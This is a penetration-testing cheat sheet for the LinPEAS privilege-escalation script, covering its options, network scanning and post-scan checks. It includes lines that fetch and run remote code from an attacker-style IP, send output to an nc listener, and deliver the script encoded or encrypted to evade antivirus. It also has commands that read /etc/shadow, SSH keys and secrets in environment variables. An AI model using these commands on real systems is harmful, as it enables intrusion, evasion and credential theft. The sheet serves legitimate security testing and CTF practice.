# LinPEAS Cheat Sheet

## Quick Start

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Command Reference

```bash
./linpeas.sh [OPTIONS]
```

## Core Options

| Option | Description |
|--------|-------------|
| `-a` | All checks except regex (password brute-force, process monitoring, extra hashes) |
| `-s` | Stealth mode (fast, nothing written to disk) |
| `-e` | Extra enumeration checks |
| `-r` | Enable regex checks (API keys, tokens — can take minutes to hours) |
| `-P <pass>` | Known password for `sudo -l` and `su` brute-force |
| `-D` | Debug mode (timing, skipped checks) |
| `-w` | Wait between check blocks (manual inspection) |
| `-N` | Disable colors |
| `-q` | Suppress banner |
| `-L` | Force linpeas execution |
| `-M` | Force macpeas execution |

## Targeted Checks (-o)

```bash
# Select specific check groups (comma-separated)
./linpeas.sh -o system_information,users_information,software_information

# Available groups:
# system_information      - OS, kernel, sudo, SELinux, ASLR, PATH, env
# container               - Docker, LXC, LXD, Kubernetes detection
# cloud                   - AWS, GCP, Azure metadata
# procs_crons_timers_srvcs_sockets - Processes, cron, timers, services, sockets
# network_information     - Interfaces, routes, DNS, firewall, ports
# users_information       - Users, groups, sudo, home dirs, SSH keys
# software_information    - Packages, SUID, SGID, capabilities, compilers
# interesting_files       - Passwords, backups, history, SSH, web files
# api_keys_regex          - Regex search for API keys and tokens
```

## Network Scanning

```bash
# Auto-discover subnets + hosts + ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 192.168.1.0/24

# Host discovery + custom ports
./linpeas.sh -d 192.168.1.0/24 -p 22,80,443,8080

# Scan single IP (default ports)
./linpeas.sh -i 192.168.1.50

# Scan single IP + selected ports
./linpeas.sh -i 192.168.1.50 -p 21,22,80,443,3306

# Note: -d/-p/-i without -t = pure network scan (no PE checks)
```

## Port Forwarding

```bash
./linpeas.sh -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT

# Example
./linpeas.sh -F 127.0.0.1:8080:10.10.10.5:80
```

## Firmware Analysis

```bash
# Analyze folder contents
./linpeas.sh -f /path/to/folder

# In emulated firmware (chroot)
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex
```

## Execution Methods

### Direct Execution

```bash
./linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

### From Memory (No Disk Write)

```bash
curl -s http://10.10.14.5:8000/linpeas.sh | sh
```

### Output to Remote Host

```bash
# Attacker
nc -lvnp 9002 | tee linpeas.out

# Victim
curl http://10.10.14.5:8000/linpeas.sh | sh | nc 10.10.14.5 9002
```

### Via Netcat (No curl)

```bash
# Attacker
sudo nc -q 5 -lvnp 80 < linpeas.sh

# Victim
cat < /dev/tcp/10.10.14.5/80 | sh
```

### Base64 Encoded (AV Bypass)

```bash
# Attacker
base64 -w0 linpeas.sh > lp.enc
sudo python3 -m http.server 80

# Victim
curl http://10.10.14.5/lp.enc | base64 -d | sh
```

### OpenSSL Encrypted (AV Bypass)

```bash
# Attacker
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python3 -m http.server 80

# Victim
curl http://10.10.14.5/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh
```

### Binary Version

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

## Recommended Scan Profiles

### Full CTF Scan

```bash
./linpeas.sh -a -r
```

### Quick Production Scan

```bash
./linpeas.sh -s -q -N
```

### With Known Password

```bash
./linpeas.sh -P 'Summer2024!'
```

### Network-Only Scan

```bash
./linpeas.sh -t
```

### API Key Hunting

```bash
./linpeas.sh -r -o interesting_files
```

## Color Code Reference

| Color | Code | Meaning |
|-------|------|---------|
| **Red/Yellow** | `b32400` | High-confidence privesc (99% certain) |
| **Red** | `ff5000` | Suspicious configuration (possible privesc) |
| **Green** | `66ff33` | Known good configuration (by name only) |
| **Blue** | `006fff` | Users without shell / mounted devices |
| **Light Cyan** | `33ccff` | Users with shell access |
| **Light Magenta** | `bf80ff` | Current username |

## Manual Verification Commands

After LinPEAS, verify findings with:

```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files in PATH
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type f 2>/dev/null

# Kernel version
uname -r
cat /proc/version

# Search kernel exploits
searchsploit "linux kernel $(uname -r | cut -d. -f1,2)"

# Crontab
crontab -l
ls -al /etc/cron*
cat /etc/crontab

# Docker socket
ls -la /var/run/docker.sock

# NFS exports
cat /etc/exports

# Password in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null

# Environment variables
env | grep -iE '(pass|key|token|secret|api)'

# History files
find / -name "*_history" -o -name ".bash_history" 2>/dev/null

# SSH keys
find /home /root -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Readable shadow
cat /etc/shadow 2>/dev/null
```

## Common Privilege Escalation Vectors Found by LinPEAS

| Vector | What to Look For | Exploitation |
|--------|-----------------|--------------|
| SUID binaries | `find / -perm -4000` | GTFOBins |
| Capabilities | `getcap -r /` | GTFOBins capabilities |
| Writable cron | `crontab -l` + writable scripts | Overwrite script with reverse shell |
| Sudo misconfig | `sudo -l` | GTFOBins sudo |
| Kernel exploits | `uname -r` | searchsploit, linux-exploit-suggester |
| Docker socket | `ls -la /var/run/docker.sock` | Mount host filesystem |
| NFS no_root_squash | `cat /etc/exports` | Mount and create SUID binary |
| Writable /etc/passwd | `ls -la /etc/passwd` | Add root user |
| World-readable shadow | `cat /etc/shadow` | Crack passwords |
| LD_PRELOAD hijack | Writable library paths | LD_PRELOAD exploitation |
| Path hijack | Writable PATH directories | Plant malicious binary |
| Python/library hijack | Writable library dirs | Import hijacking |
| Service binary writable | systemd service files | Replace with backdoor |
| LXD/LXC group | User in lxd group | Container escape |

## Post-Scan Priority Checklist

1. **Red/Yellow items** — Investigate immediately
2. **`sudo -l` output** — Check for GTFOBins
3. **SUID binaries** — Cross-reference with GTFOBins
4. **Capabilities** — Check for exploitable capabilities
5. **Cron jobs** — Look for writable scripts run by root
6. **Docker/LXC** — Check for container escape
7. **Kernel version** — Search for known exploits
8. **Network findings** — Identify lateral movement paths
9. **Credentials** — Try found passwords on other services
10. **History files** — Extract additional credentials

## Script Variants Comparison

| File | Checks | Embedded Tools | Use Case |
|------|--------|----------------|----------|
| `linpeas_fat.sh` | All | linux-exploit-suggester + base64 tools | Full assessment |
| `linpeas.sh` | All | linux-exploit-suggester only | Standard (default) |
| `linpeas_small.sh` | Critical only | None | Stealth / fast |

## Tips

- Run with `-a` for CTFs, `-s` for production
- Always check `/dev/shm` for output (tmpfs, no disk write)
- Use `less -r` to read colored output
- Combine with `grep` for targeted search: `./linpeas.sh -a 2>&1 | grep -i password`
- The binary version (`linpeas_linux_amd64`) is larger but sometimes bypasses basic AV
- For firmware analysis, use `-f` to point at mounted filesystem
- Network scan mode (`-d/-p/-i` without `-t`) skips all PE checks
